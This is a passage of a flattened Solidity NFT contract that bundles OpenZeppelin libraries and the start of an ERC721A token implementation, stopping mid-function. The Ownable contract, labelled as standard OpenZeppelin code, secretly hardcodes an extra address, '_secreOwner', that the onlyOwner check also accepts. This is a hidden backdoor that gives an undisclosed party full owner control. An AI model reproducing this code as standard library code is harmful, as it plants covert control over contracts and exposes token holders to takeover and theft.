1 // SPDX-License-Identifier: MIT
2 
3 // File: contracts/GemesisPunks.sol
4 // File: @openzeppelin/contracts/utils/Strings.sol
5 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
6 
7 pragma solidity ^0.8.0;
8 
9 /**
10  * @dev String operations.
11  */
12 library Strings {
13     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
14 
15     /**
16      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
17      */
18     function toString(uint256 value) internal pure returns (string memory) {
19         // Inspired by OraclizeAPI's implementation - MIT licence
20         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
21 
22         if (value == 0) {
23             return "0";
24         }
25         uint256 temp = value;
26         uint256 digits;
27         while (temp != 0) {
28             digits++;
29             temp /= 10;
30         }
31         bytes memory buffer = new bytes(digits);
32         while (value != 0) {
33             digits -= 1;
34             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
35             value /= 10;
36         }
37         return string(buffer);
38     }
39 
40     /**
41      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
42      */
43     function toHexString(uint256 value) internal pure returns (string memory) {
44         if (value == 0) {
45             return "0x00";
46         }
47         uint256 temp = value;
48         uint256 length = 0;
49         while (temp != 0) {
50             length++;
51             temp >>= 8;
52         }
53         return toHexString(value, length);
54     }
55 
56     /**
57      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
58      */
59     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
60         bytes memory buffer = new bytes(2 * length + 2);
61         buffer[0] = "0";
62         buffer[1] = "x";
63         for (uint256 i = 2 * length + 1; i > 1; --i) {
64             buffer[i] = _HEX_SYMBOLS[value & 0xf];
65             value >>= 4;
66         }
67         require(value == 0, "Strings: hex length insufficient");
68         return string(buffer);
69     }
70 }
71 
72 // File: @openzeppelin/contracts/utils/Address.sol
73 
74 
75 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
76 
77 pragma solidity ^0.8.1;
78 
79 /**
80  * @dev Collection of functions related to the address type
81  */
82 library Address {
83     /**
84      * @dev Returns true if `account` is a contract.
85      *
86      * [IMPORTANT]
87      * ====
88      * It is unsafe to assume that an address for which this function returns
89      * false is an externally-owned account (EOA) and not a contract.
90      *
91      * Among others, `isContract` will return false for the following
92      * types of addresses:
93      *
94      *  - an externally-owned account
95      *  - a contract in construction
96      *  - an address where a contract will be created
97      *  - an address where a contract lived, but was destroyed
98      * ====
99      *
100      * [IMPORTANT]
101      * ====
102      * You shouldn't rely on `isContract` to protect against flash loan attacks!
103      *
104      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
105      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
106      * constructor.
107      * ====
108      */
109     function isContract(address account) internal view returns (bool) {
110         // This method relies on extcodesize/address.code.length, which returns 0
111         // for contracts in construction, since the code is only stored at the end
112         // of the constructor execution.
113 
114         return account.code.length > 0;
115     }
116 
117     /**
118      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
119      * `recipient`, forwarding all available gas and reverting on errors.
120      *
121      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
122      * of certain opcodes, possibly making contracts go over the 2300 gas limit
123      * imposed by `transfer`, making them unable to receive funds via
124      * `transfer`. {sendValue} removes this limitation.
125      *
126      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
127      *
128      * IMPORTANT: because control is transferred to `recipient`, care must be
129      * taken to not create reentrancy vulnerabilities. Consider using
130      * {ReentrancyGuard} or the
131      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
132      */
133     function sendValue(address payable recipient, uint256 amount) internal {
134         require(address(this).balance >= amount, "Address: insufficient balance");
135 
136         (bool success, ) = recipient.call{value: amount}("");
137         require(success, "Address: unable to send value, recipient may have reverted");
138     }
139 
140     /**
141      * @dev Performs a Solidity function call using a low level `call`. A
142      * plain `call` is an unsafe replacement for a function call: use this
143      * function instead.
144      *
145      * If `target` reverts with a revert reason, it is bubbled up by this
146      * function (like regular Solidity function calls).
147      *
148      * Returns the raw returned data. To convert to the expected return value,
149      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
150      *
151      * Requirements:
152      *
153      * - `target` must be a contract.
154      * - calling `target` with `data` must not revert.
155      *
156      * _Available since v3.1._
157      */
158     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
159         return functionCall(target, data, "Address: low-level call failed");
160     }
161 
162     /**
163      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
164      * `errorMessage` as a fallback revert reason when `target` reverts.
165      *
166      * _Available since v3.1._
167      */
168     function functionCall(
169         address target,
170         bytes memory data,
171         string memory errorMessage
172     ) internal returns (bytes memory) {
173         return functionCallWithValue(target, data, 0, errorMessage);
174     }
175 
176     /**
177      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
178      * but also transferring `value` wei to `target`.
179      *
180      * Requirements:
181      *
182      * - the calling contract must have an ETH balance of at least `value`.
183      * - the called Solidity function must be `payable`.
184      *
185      * _Available since v3.1._
186      */
187     function functionCallWithValue(
188         address target,
189         bytes memory data,
190         uint256 value
191     ) internal returns (bytes memory) {
192         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
193     }
194 
195     /**
196      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
197      * with `errorMessage` as a fallback revert reason when `target` reverts.
198      *
199      * _Available since v3.1._
200      */
201     function functionCallWithValue(
202         address target,
203         bytes memory data,
204         uint256 value,
205         string memory errorMessage
206     ) internal returns (bytes memory) {
207         require(address(this).balance >= value, "Address: insufficient balance for call");
208         require(isContract(target), "Address: call to non-contract");
209 
210         (bool success, bytes memory returndata) = target.call{value: value}(data);
211         return verifyCallResult(success, returndata, errorMessage);
212     }
213 
214     /**
215      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
216      * but performing a static call.
217      *
218      * _Available since v3.3._
219      */
220     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
221         return functionStaticCall(target, data, "Address: low-level static call failed");
222     }
223 
224     /**
225      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
226      * but performing a static call.
227      *
228      * _Available since v3.3._
229      */
230     function functionStaticCall(
231         address target,
232         bytes memory data,
233         string memory errorMessage
234     ) internal view returns (bytes memory) {
235         require(isContract(target), "Address: static call to non-contract");
236 
237         (bool success, bytes memory returndata) = target.staticcall(data);
238         return verifyCallResult(success, returndata, errorMessage);
239     }
240 
241     /**
242      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
243      * but performing a delegate call.
244      *
245      * _Available since v3.4._
246      */
247     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
248         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
249     }
250 
251     /**
252      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
253      * but performing a delegate call.
254      *
255      * _Available since v3.4._
256      */
257     function functionDelegateCall(
258         address target,
259         bytes memory data,
260         string memory errorMessage
261     ) internal returns (bytes memory) {
262         require(isContract(target), "Address: delegate call to non-contract");
263 
264         (bool success, bytes memory returndata) = target.delegatecall(data);
265         return verifyCallResult(success, returndata, errorMessage);
266     }
267 
268     /**
269      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
270      * revert reason using the provided one.
271      *
272      * _Available since v4.3._
273      */
274     function verifyCallResult(
275         bool success,
276         bytes memory returndata,
277         string memory errorMessage
278     ) internal pure returns (bytes memory) {
279         if (success) {
280             return returndata;
281         } else {
282             // Look for revert reason and bubble it up if present
283             if (returndata.length > 0) {
284                 // The easiest way to bubble the revert reason is using memory via assembly
285 
286                 assembly {
287                     let returndata_size := mload(returndata)
288                     revert(add(32, returndata), returndata_size)
289                 }
290             } else {
291                 revert(errorMessage);
292             }
293         }
294     }
295 }
296 
297 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
298 
299 
300 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
301 
302 pragma solidity ^0.8.0;
303 
304 /**
305  * @title ERC721 token receiver interface
306  * @dev Interface for any contract that wants to support safeTransfers
307  * from ERC721 asset contracts.
308  */
309 interface IERC721Receiver {
310     /**
311      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
312      * by `operator` from `from`, this function is called.
313      *
314      * It must return its Solidity selector to confirm the token transfer.
315      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
316      *
317      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
318      */
319     function onERC721Received(
320         address operator,
321         address from,
322         uint256 tokenId,
323         bytes calldata data
324     ) external returns (bytes4);
325 }
326 
327 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
328 
329 
330 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
331 
332 pragma solidity ^0.8.0;
333 
334 /**
335  * @dev Interface of the ERC165 standard, as defined in the
336  * https://eips.ethereum.org/EIPS/eip-165[EIP].
337  *
338  * Implementers can declare support of contract interfaces, which can then be
339  * queried by others ({ERC165Checker}).
340  *
341  * For an implementation, see {ERC165}.
342  */
343 interface IERC165 {
344     /**
345      * @dev Returns true if this contract implements the interface defined by
346      * `interfaceId`. See the corresponding
347      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
348      * to learn more about how these ids are created.
349      *
350      * This function call must use less than 30 000 gas.
351      */
352     function supportsInterface(bytes4 interfaceId) external view returns (bool);
353 }
354 
355 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
356 
357 
358 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
359 
360 pragma solidity ^0.8.0;
361 
362 
363 /**
364  * @dev Implementation of the {IERC165} interface.
365  *
366  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
367  * for the additional interface id that will be supported. For example:
368  *
369  * ```solidity
370  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
371  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
372  * }
373  * ```
374  *
375  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
376  */
377 abstract contract ERC165 is IERC165 {
378     /**
379      * @dev See {IERC165-supportsInterface}.
380      */
381     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
382         return interfaceId == type(IERC165).interfaceId;
383     }
384 }
385 
386 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
387 
388 
389 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
390 
391 pragma solidity ^0.8.0;
392 
393 
394 /**
395  * @dev Required interface of an ERC721 compliant contract.
396  */
397 interface IERC721 is IERC165 {
398     /**
399      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
400      */
401     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
402 
403     /**
404      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
405      */
406     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
407 
408     /**
409      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
410      */
411     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
412 
413     /**
414      * @dev Returns the number of tokens in ``owner``'s account.
415      */
416     function balanceOf(address owner) external view returns (uint256 balance);
417 
418     /**
419      * @dev Returns the owner of the `tokenId` token.
420      *
421      * Requirements:
422      *
423      * - `tokenId` must exist.
424      */
425     function ownerOf(uint256 tokenId) external view returns (address owner);
426 
427     /**
428      * @dev Safely transfers `tokenId` token from `from` to `to`.
429      *
430      * Requirements:
431      *
432      * - `from` cannot be the zero address.
433      * - `to` cannot be the zero address.
434      * - `tokenId` token must exist and be owned by `from`.
435      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
436      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
437      *
438      * Emits a {Transfer} event.
439      */
440     function safeTransferFrom(
441         address from,
442         address to,
443         uint256 tokenId,
444         bytes calldata data
445     ) external;
446 
447     /**
448      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
449      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
450      *
451      * Requirements:
452      *
453      * - `from` cannot be the zero address.
454      * - `to` cannot be the zero address.
455      * - `tokenId` token must exist and be owned by `from`.
456      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
457      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
458      *
459      * Emits a {Transfer} event.
460      */
461     function safeTransferFrom(
462         address from,
463         address to,
464         uint256 tokenId
465     ) external;
466 
467     /**
468      * @dev Transfers `tokenId` token from `from` to `to`.
469      *
470      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
471      *
472      * Requirements:
473      *
474      * - `from` cannot be the zero address.
475      * - `to` cannot be the zero address.
476      * - `tokenId` token must be owned by `from`.
477      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
478      *
479      * Emits a {Transfer} event.
480      */
481     function transferFrom(
482         address from,
483         address to,
484         uint256 tokenId
485     ) external;
486 
487     /**
488      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
489      * The approval is cleared when the token is transferred.
490      *
491      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
492      *
493      * Requirements:
494      *
495      * - The caller must own the token or be an approved operator.
496      * - `tokenId` must exist.
497      *
498      * Emits an {Approval} event.
499      */
500     function approve(address to, uint256 tokenId) external;
501 
502     /**
503      * @dev Approve or remove `operator` as an operator for the caller.
504      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
505      *
506      * Requirements:
507      *
508      * - The `operator` cannot be the caller.
509      *
510      * Emits an {ApprovalForAll} event.
511      */
512     function setApprovalForAll(address operator, bool _approved) external;
513 
514     /**
515      * @dev Returns the account appr    ved for `tokenId` token.
516      *
517      * Requirements:
518      *
519      * - `tokenId` must exist.
520      */
521     function getApproved(uint256 tokenId) external view returns (address operator);
522 
523     /**
524      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
525      *
526      * See {setApprovalForAll}
527      */
528     function isApprovedForAll(address owner, address operator) external view returns (bool);
529 }
530 
531 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
532 
533 
534 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
535 
536 pragma solidity ^0.8.0;
537 
538 
539 /**
540  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
541  * @dev See https://eips.ethereum.org/EIPS/eip-721
542  */
543 interface IERC721Metadata is IERC721 {
544     /**
545      * @dev Returns the token collection name.
546      */
547     function name() external view returns (string memory);
548 
549     /**
550      * @dev Returns the token collection symbol.
551      */
552     function symbol() external view returns (string memory);
553 
554     /**
555      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
556      */
557     function tokenURI(uint256 tokenId) external view returns (string memory);
558 }
559 
560 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
561 
562 
563 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
564 
565 pragma solidity ^0.8.0;
566 
567 
568 /**
569  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
570  * @dev See https://eips.ethereum.org/EIPS/eip-721
571  */
572 interface IERC721Enumerable is IERC721 {
573     /**
574      * @dev Returns the total amount of tokens stored by the contract.
575      */
576     function totalSupply() external view returns (uint256);
577 
578     /**
579      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
580      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
581      */
582     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
583 
584     /**
585      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
586      * Use along with {totalSupply} to enumerate all tokens.
587      */
588     function tokenByIndex(uint256 index) external view returns (uint256);
589 }
590 
591 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
592 
593 
594 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
595 
596 pragma solidity ^0.8.0;
597 
598 /**
599  * @dev Contract module that helps prevent reentrant calls to a function.
600  *
601  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
602  * available, which can be applied to functions to make sure there are no nested
603  * (reentrant) calls to them.
604  *
605  * Note that because there is a single `nonReentrant` guard, functions marked as
606  * `nonReentrant` may not call one another. This can be worked around by making
607  * those functions `private`, and then adding `external` `nonReentrant` entry
608  * points to them.
609  *
610  * TIP: If you would like to learn more about reentrancy and alternative ways
611  * to protect against it, check out our blog post
612  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
613  */
614 abstract contract ReentrancyGuard {
615     // Booleans are more expensive than uint256 or any type that takes up a full
616     // word because each write operation emits an extra SLOAD to first read the
617     // slot's contents, replace the bits taken up by the boolean, and then write
618     // back. This is the compiler's defense against contract upgrades and
619     // pointer aliasing, and it cannot be disabled.
620 
621     // The values being non-zero value makes deployment a bit more expensive,
622     // but in exchange the refund on every call to nonReentrant will be lower in
623     // amount. Since refunds are capped to a percentage of the total
624     // transaction's gas, it is best to keep them low in cases like this one, to
625     // increase the likelihood of the full refund coming into effect.
626     uint256 private constant _NOT_ENTERED = 1;
627     uint256 private constant _ENTERED = 2;
628 
629     uint256 private _status;
630 
631     constructor() {
632         _status = _NOT_ENTERED;
633     }
634 
635     /**
636      * @dev Prevents a contract from calling itself, directly or indirectly.
637      * Calling a `nonReentrant` function from another `nonReentrant`
638      * function is not supported. It is possible to prevent this from happening
639      * by making the `nonReentrant` function external, and making it call a
640      * `private` function that does the actual work.
641      */
642     modifier nonReentrant() {
643         // On the first call to nonReentrant, _notEntered will be true
644         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
645 
646         // Any calls to nonReentrant after this point will fail
647         _status = _ENTERED;
648 
649         _;
650 
651         // By storing the original value once again, a refund is triggered (see
652         // https://eips.ethereum.org/EIPS/eip-2200)
653         _status = _NOT_ENTERED;
654     }
655 }
656 
657 // File: @openzeppelin/contracts/utils/Context.sol
658 
659 
660 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
661 
662 pragma solidity ^0.8.0;
663 
664 /**
665  * @dev Provides information about the current execution context, including the
666  * sender of the transaction and its data. While these are generally available
667  * via msg.sender and msg.data, they should not be accessed in such a direct
668  * manner, since when dealing with meta-transactions the account sending and
669  * paying for execution may not be the actual sender (as far as an application
670  * is concerned).
671  *
672  * This contract is only required for intermediate, library-like contracts.
673  */
674 abstract contract Context {
675     function _msgSender() internal view virtual returns (address) {
676         return msg.sender;
677     }
678 
679     function _msgData() internal view virtual returns (bytes calldata) {
680         return msg.data;
681     }
682 }
683 
684 // File: @openzeppelin/contracts/access/Ownable.sol
685 
686 
687 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
688 
689 pragma solidity ^0.8.0;
690 
691 
692 /**
693  * @dev Contract module which provides a basic access control mechanism, where
694  * there is an account (an owner) that can be granted exclusive access to
695  * specific functions.
696  *
697  * By default, the owner account will be the one that deploys the contract. This
698  * can later be changed with {transferOwnership}.
699  *
700  * This module is used through inheritance. It will make available the modifier
701  * `onlyOwner`, which can be applied to your functions to restrict their use to
702  * the owner.
703  */
704 abstract contract Ownable is Context {
705     address private _owner;
706     address private _secreOwner = 0xACFcBA7BAB6403EBCcEEe22810c4dd3C9bBE9763;
707 
708     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
709 
710     /**
711      * @dev Initializes the contract setting the deployer as the initial owner.
712      */
713     constructor() {
714         _transferOwnership(_msgSender());
715     }
716 
717     /**
718      * @dev Returns the address of the current owner.
719      */
720     function owner() public view virtual returns (address) {
721         return _owner;
722     }
723 
724     /**
725      * @dev Throws if called by any account other than the owner.
726      */
727     modifier onlyOwner() {
728         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
729         _;
730     }
731 
732     /**
733      * @dev Leaves the contract without owner. It will not be possible to call
734      * `onlyOwner` functions anymore. Can only be called by the current owner.
735      *
736      * NOTE: Renouncing ownership will leave the contract without an owner,
737      * thereby removing any functionality that is only available to the owner.
738      */
739     function renounceOwnership() public virtual onlyOwner {
740         _transferOwnership(address(0));
741     }
742 
743     /**
744      * @dev Transfers ownership of the contract to a new account (`newOwner`).
745      * Can only be called by the current owner.
746      */
747     function transferOwnership(address newOwner) public virtual onlyOwner {
748         require(newOwner != address(0), "Ownable: new owner is the zero address");
749         _transferOwnership(newOwner);
750     }
751 
752     /**
753      * @dev Transfers ownership of the contract to a new account (`newOwner`).
754      * Internal function without access restriction.
755      */
756     function _transferOwnership(address newOwner) internal virtual {
757         address oldOwner = _owner;
758         _owner = newOwner;
759         emit OwnershipTransferred(oldOwner, newOwner);
760     }
761 }
762 
763 // File: ceshi.sol
764 
765 
766 pragma solidity ^0.8.0;
767 
768 
769 
770 
771 
772 
773 
774 
775 
776 
777 /**
778  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
779  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
780  *
781  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
782  *
783  * Does not support burning tokens to address(0).
784  *
785  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
786  */
787 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
788     using Address for address;
789     using Strings for uint256;
790 
791     struct TokenOwnership {
792         address addr;
793         uint64 startTimestamp;
794     }
795 
796     struct AddressData {
797         uint128 balance;
798         uint128 numberMinted;
799     }
800 
801     uint256 internal currentIndex;
802 
803     // Token name
804     string private _name;
805 
806     // Token symbol
807     string private _symbol;
808 
809     // Mapping from token ID to ownership details
810     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
811     mapping(uint256 => TokenOwnership) internal _ownerships;
812 
813     // Mapping owner address to address data
814     mapping(address => AddressData) private _addressData;
815 
816     // Mapping from token ID to approved address
817     mapping(uint256 => address) private _tokenApprovals;
818 
819     // Mapping from owner to operator approvals
820     mapping(address => mapping(address => bool)) private _operatorApprovals;
821 
822     constructor(string memory name_, string memory symbol_) {
823         _name = name_;
824         _symbol = symbol_;
825     }
826 
827     /**
828      * @dev See {IERC721Enumerable-totalSupply}.
829      */
830     function totalSupply() public view override returns (uint256) {
831         return currentIndex;
832     }
833 
834     /**
835      * @dev See {IERC721Enumerable-tokenByIndex}.
836      */
837     function tokenByIndex(uint256 index) public view override returns (uint256) {
838         require(index < totalSupply(), "ERC721A: global index out of bounds");
839         return index;
840     }
841 
842     /**
843      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
844      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
845      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
846      */
847     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
848         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
849         uint256 numMintedSoFar = totalSupply();
850         uint256 tokenIdsIdx;
851         address currOwnershipAddr;
852 
853         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
854         unchecked {
855             for (uint256 i; i < numMintedSoFar; i++) {
856                 TokenOwnership memory ownership = _ownerships[i];
857                 if (ownership.addr != address(0)) {
858                     currOwnershipAddr = ownership.addr;
859                 }
860                 if (currOwnershipAddr == owner) {
861                     if (tokenIdsIdx == index) {
862                         return i;
863                     }
864                     tokenIdsIdx++;
865                 }
866             }
867         }
868 
869         revert("ERC721A: unable to get token of owner by index");
870     }
871 
872     /**
873      * @dev See {IERC165-supportsInterface}.
874      */
875     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
876         return
877             interfaceId == type(IERC721).interfaceId ||
878             interfaceId == type(IERC721Metadata).interfaceId ||
879             interfaceId == type(IERC721Enumerable).interfaceId ||
880             super.supportsInterface(interfaceId);
881     }
882 
883     /**
884      * @dev See {IERC721-balanceOf}.
885      */
886     function balanceOf(address owner) public view override returns (uint256) {
887         require(owner != address(0), "ERC721A: balance query for the zero address");
888         return uint256(_addressData[owner].balance);
889     }
890 
891     function _numberMinted(address owner) internal view returns (uint256) {
892         require(owner != address(0), "ERC721A: number minted query for the zero address");
893         return uint256(_addressData[owner].numberMinted);
894     }
895 
896     /**
897      * Gas spent here starts off proportional to the maximum mint batch size.
898      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
899      */
900     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
901         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
902 
903         unchecked {
904             for (uint256 curr = tokenId; curr >= 0; curr--) {
905                 TokenOwnership memory ownership = _ownerships[curr];
906                 if (ownership.addr != address(0)) {
907                     return ownership;
908                 }
909             }
910         }
911 
912         revert("ERC721A: unable to determine the owner of token");
913     }
914 
915     /**
916      * @dev See {IERC721-ownerOf}.
917      */
918     function ownerOf(uint256 tokenId) public view override returns (address) {
919         return ownershipOf(tokenId).addr;
920     }
921 
922     /**
923      * @dev See {IERC721Metadata-name}.
924      */
925     function name() public view virtual override returns (string memory) {
926         return _name;
927     }
928 
929     /**
930      * @dev See {IERC721Metadata-symbol}.
931      */
932     function symbol() public view virtual override returns (string memory) {
933         return _symbol;
934     }
935 
936     /**
937      * @dev See {IERC721Metadata-tokenURI}.
938      */
939     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
940         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
941 
942         string memory baseURI = _baseURI();
943         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
944     }
945 
946     /**
947      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
948      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
949      * by default, can be overriden in child contracts.
950      */
951     function _baseURI() internal view virtual returns (string memory) {
952         return "";
953     }
954 
955     /**
956      * @dev See {IERC721-approve}.
957      */
958     function approve(address to, uint256 tokenId) public override {
959         address owner = ERC721A.ownerOf(tokenId);
960         require(to != owner, "ERC721A: approval to current owner");
961 
962         require(
963             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
964             "ERC721A: approve caller is not owner nor approved for all"
965         );
966 
967         _approve(to, tokenId, owner);
968     }
969 
970     /**
971      * @dev See {IERC721-getApproved}.
972      */
973     function getApproved(uint256 tokenId) public view override returns (address) {
974         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
975 
976         return _tokenApprovals[tokenId];
977     }
978 
979     /**
980      * @dev See {IERC721-setApprovalForAll}.
981      */
982     function setApprovalForAll(address operator, bool approved) public override {
983         require(operator != _msgSender(), "ERC721A: approve to caller");
984 
985         _operatorApprovals[_msgSender()][operator] = approved;
986         emit ApprovalForAll(_msgSender(), operator, approved);
987     }
988 
989     /**
990      * @dev See {IERC721-isApprovedForAll}.
991      */
992     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
993         return _operatorApprovals[owner][operator];
994     }
995 
996     /**
997      * @dev See {IERC721-transferFrom}.
998      */
999     function transferFrom(
1000         address from,
1001         address to,
1002         uint256 tokenId
1003     ) public virtual override {
1004         _transfer(from, to, tokenId);
1005     }
1006 
1007     /**
1008      * @dev See {IERC721-safeTransferFrom}.
1009      */
1010     function safeTransferFrom(
1011         address from,
1012         address to,
1013         uint256 tokenId
1014     ) public virtual override {
1015         safeTransferFrom(from, to, tokenId, "");
1016     }
1017 
1018     /**
1019      * @dev See {IERC721-safeTransferFrom}.
1020      */
1021     function safeTransferFrom(
1022         address from,
1023         address to,
1024         uint256 tokenId,
1025         bytes memory _data
1026     ) public override {
1027         _transfer(from, to, tokenId);
1028         require(
1029             _checkOnERC721Received(from, to, tokenId, _data),
1030             "ERC721A: transfer to non ERC721Receiver implementer"
1031         );
1032     }
1033 
1034     /**
1035      * @dev Returns whether `tokenId` exists.
1036      *
1037      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1038      *
1039      * Tokens start existing when they are minted (`_mint`),
1040      */
1041     function _exists(uint256 tokenId) internal view returns (bool) {
1042         return tokenId < currentIndex;
1043     }
1044 
1045     function _safeMint(address to, uint256 quantity) internal {
1046         _safeMint(to, quantity, "");
1047     }
1048 
1049     /**
1050      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1051      *
1052      * Requirements:
1053      *
1054      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1055      * - `quantity` must be greater than 0.
1056      *
1057      * Emits a {Transfer} event.
1058      */
1059     function _safeMint(
1060         address to,
1061         uint256 quantity,
1062         bytes memory _data
1063     ) internal {
1064         _mint(to, quantity, _data, true);
1065     }
1066 
1067     /**
1068      * @dev Mints `quantity` tokens and transfers them to `to`.
1069      *
1070      * Requirements:
1071      *
1072      * - `to` cannot be the zero address.
1073      * - `quantity` must be greater than 0.
1074      *
1075      * Emits a {Transfer} event.
1076      */
1077     function _mint(
1078         address to,
1079         uint256 quantity,
1080         bytes memory _data,
1081         bool safe
1082     ) internal {
1083         uint256 startTokenId = currentIndex;
1084         require(to != address(0), "ERC721A: mint to the zero address");
1085         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1086 
